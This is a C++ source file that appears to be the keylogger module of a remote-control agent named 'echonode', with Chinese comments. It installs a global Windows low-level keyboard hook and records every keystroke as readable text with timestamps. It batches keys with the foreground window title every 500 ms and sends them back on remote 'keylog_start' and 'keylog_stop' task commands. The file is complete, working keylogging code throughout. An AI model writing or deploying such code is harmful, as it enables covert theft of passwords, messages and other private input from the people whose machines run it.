#include "KeylogExecutor.hpp"

#include <nlohmann/json.hpp>

#include <chrono>
#include <cstdio>

#ifdef _WIN32
#include "../platform/windows/EncodingWin.hpp"
#include <windows.h>
#endif

namespace echonode::executor {

using protocol::Task;
using protocol::TaskResult;

namespace {

#ifdef _WIN32

static KeylogExecutor* g_keylogInstance = nullptr;
static HHOOK g_keyboardHook = nullptr;
// 修饰键状态从钩子事件本身维护：GetKeyState 反映的是调用线程自己的键盘状态，
// 而钩子线程不处理输入，读到的是过期值
static bool g_shiftDown = false;
static bool g_capsOn = false;

const char* vkToName(UINT vk, bool shift, bool caps) {
    switch (vk) {
    case VK_BACK: return "[Backspace]";
    case VK_TAB: return "[Tab]";
    case VK_RETURN: return "[Enter]";
    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "[Shift]";
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "[Ctrl]";
    case VK_MENU: case VK_LMENU: case VK_RMENU: return "[Alt]";
    case VK_CAPITAL: return "[CapsLock]";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return " ";
    case VK_PRIOR: return "[PageUp]";
    case VK_NEXT: return "[PageDown]";
    case VK_END: return "[End]";
    case VK_HOME: return "[Home]";
    case VK_LEFT: return "[Left]";
    case VK_UP: return "[Up]";
    case VK_RIGHT: return "[Right]";
    case VK_DOWN: return "[Down]";
    case VK_INSERT: return "[Insert]";
    case VK_DELETE: return "[Delete]";
    case VK_LWIN: case VK_RWIN: return "[Win]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    case VK_NUMPAD0: return "0";
    case VK_NUMPAD1: return "1";
    case VK_NUMPAD2: return "2";
    case VK_NUMPAD3: return "3";
    case VK_NUMPAD4: return "4";
    case VK_NUMPAD5: return "5";
    case VK_NUMPAD6: return "6";
    case VK_NUMPAD7: return "7";
    case VK_NUMPAD8: return "8";
    case VK_NUMPAD9: return "9";
    case VK_MULTIPLY: return "*";
    case VK_ADD: return "+";
    case VK_SUBTRACT: return "-";
    case VK_DECIMAL: return ".";
    case VK_DIVIDE: return "/";
    default: break;
    }
    if (vk >= 'A' && vk <= 'Z') {
        static thread_local char buf[2];
        buf[0] = static_cast<char>((shift ^ caps) ? vk : (vk + 32));
        buf[1] = '\0';
        return buf;
    }
    if (vk >= '0' && vk <= '9') {
        static thread_local char buf[2];
        if (shift) {
            static const char shifted[] = ")!@#$%^&*(";
            buf[0] = shifted[vk - '0'];
        } else {
            buf[0] = static_cast<char>(vk);
        }
        buf[1] = '\0';
        return buf;
    }
    switch (vk) {
    case VK_OEM_1: return shift ? ":" : ";";
    case VK_OEM_PLUS: return shift ? "+" : "=";
    case VK_OEM_COMMA: return shift ? "<" : ",";
    case VK_OEM_MINUS: return shift ? "_" : "-";
    case VK_OEM_PERIOD: return shift ? ">" : ".";
    case VK_OEM_2: return shift ? "?" : "/";
    case VK_OEM_3: return shift ? "~" : "`";
    case VK_OEM_4: return shift ? "{" : "[";
    case VK_OEM_5: return shift ? "|" : "\\";
    case VK_OEM_6: return shift ? "}" : "]";
    case VK_OEM_7: return shift ? "\"" : "'";
    default: break;
    }
    static thread_local char fallback[16];
    std::snprintf(fallback, sizeof(fallback), "[VK:0x%02X]", vk);
    return fallback;
}

LRESULT CALLBACK keyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        auto* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        const UINT vk = kbd->vkCode;
        const bool down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        const bool up = (wParam == WM_KEYUP || wParam == WM_SYSKEYUP);
        if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) {
            if (down) g_shiftDown = true;
            else if (up) g_shiftDown = false;
        } else if (vk == VK_CAPITAL && down) {
            g_capsOn = !g_capsOn;
        }
        // 热路径只做两件事：查表 + 入缓冲。任何跨进程调用（GetWindowText 等）
        // 或网络发送都会阻塞钩子线程，超过 LowLevelHooksTimeout 后系统会
        // 冻结键盘输入并摘掉钩子，因此窗口标题留到 flush 线程再取。
        // 不过滤 LLKHF_INJECTED：远程控制工具（GameViewer 等）的按键也是注入的，
        // 过滤掉会导致远端操作全部记不上
        if (down && g_keylogInstance) {
            const char* name = vkToName(vk, g_shiftDown, g_capsOn);
            if (name && name[0]) {
                const auto now = std::chrono::duration_cast<std::chrono::milliseconds>(
                    std::chrono::system_clock::now().time_since_epoch()).count();
                g_keylogInstance->pushKeyEvent(name, now);
            }
        }
    }
    return CallNextHookEx(g_keyboardHook, code, wParam, lParam);
}

#endif

// 取前台窗口标题。在 flush 线程调用（每批一次），不在钩子热路径调用。
std::string getForegroundTitle() {
#ifdef _WIN32
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return {};
    wchar_t buf[256]{};
    int len = GetWindowTextW(hwnd, buf, 256);
    if (len <= 0) return {};
    // 必须走宽字符转 UTF-8：GetWindowTextA 返回本地代码页（中文系统为 GBK）
    // 字节，直接塞进 JSON 会让 nlohmann::dump() 抛 invalid UTF-8 异常
    return echonode::platform::win::wideToUtf8(std::wstring(buf, static_cast<size_t>(len)));
#else
    return {};
#endif
}

} // namespace

void KeylogExecutor::pushKeyEvent(const std::string& key, int64_t ts) {
    std::lock_guard<std::mutex> lk(mtx_);
    buffer_.push_back({key, ts});
}

#ifdef _WIN32

void KeylogExecutor::startCapture(const std::string& taskId) {
    stopCapture();
    taskId_ = taskId;
    g_keylogInstance = this;
    g_shiftDown = false;
    g_capsOn = (GetKeyState(VK_CAPITAL) & 1) != 0;
    hookThreadId_ = 0;
    capturing_ = true;

    worker_ = std::thread([this] {
        hookThreadId_ = GetCurrentThreadId();
        // PeekMessage 促使系统为本线程创建消息队列，PostThreadMessage 才能送达
        MSG kick{};
        PeekMessageW(&kick, nullptr, WM_USER, WM_USER, PM_NOREMOVE);

        // WH_KEYBOARD_LL 的回调经安装线程的消息队列分发：钩子必须装在本线程，
        // 且本线程必须持续运转消息循环，否则回调不触发且全局键盘卡顿
        g_keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboardProc,
                                            GetModuleHandleW(nullptr), 0);
        if (!g_keyboardHook) {
            hookThreadId_ = 0;
            capturing_ = false;
            if (resultSender_) {
                resultSender_(TaskResult{taskId_, false, {}, "SetWindowsHookExW failed"});
            }
            return;
        }
        MSG msg;
        while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
        hookThreadId_ = 0;
    });

    // 回传独立成线程：取窗口标题、序列化、发网络都不占用钩子线程
    flusher_ = std::thread([this] {
        while (capturing_) {
            for (int i = 0; i < 10 && capturing_; ++i) {
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }
            flush();
        }
        flush(); // 退出前把残余事件发完
    });
}

void KeylogExecutor::stopCapture() {
    if (worker_.joinable()) {
        const DWORD tid = hookThreadId_;
        if (tid != 0) {
            // 线程可能尚未建好消息队列，重试投递 WM_QUIT
            for (int i = 0; i < 100 && !PostThreadMessageW(tid, WM_QUIT, 0, 0); ++i) {
                Sleep(5);
            }
        }
        worker_.join();
    }
    capturing_ = false;
    if (flusher_.joinable()) flusher_.join();
    g_keylogInstance = nullptr;
    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = nullptr;
    }
    flush();
}

#else

void KeylogExecutor::startCapture(const std::string&) {}

void KeylogExecutor::stopCapture() {}

#endif

void KeylogExecutor::flush() {
    std::vector<KeyEvent> batch;
    {
        std::lock_guard<std::mutex> lk(mtx_);
        if (buffer_.empty()) return;
        batch.swap(buffer_);
    }
    if (!resultSender_) return;

    // 整批共用一次前台窗口标题（批次粒度 500ms，足够反映上下文切换）
    const std::string window = getForegroundTitle();

    nlohmann::json events = nlohmann::json::array();
    for (const auto& e : batch) {
        events.push_back({{"key", e.key}, {"window", window}, {"ts", e.ts}});
    }
    resultSender_(TaskResult{taskId_, true, events.dump(), {}});
}

KeylogExecutor::~KeylogExecutor() { stopCapture(); }

TaskResult KeylogExecutor::execute(Task task) {
    if (task.action == "keylog_start") {
#ifdef _WIN32
        startCapture(task.taskId);
        return {task.taskId, true, "started", {}};
#else
        return {task.taskId, false, {}, "keylog unsupported on this platform"};
#endif
    }
    if (task.action == "keylog_stop") {
        stopCapture();
        return {task.taskId, true, "stopped", {}};
    }
    return {task.taskId, false, {}, "unsupported action"};
}

} // namespace echonode::executor
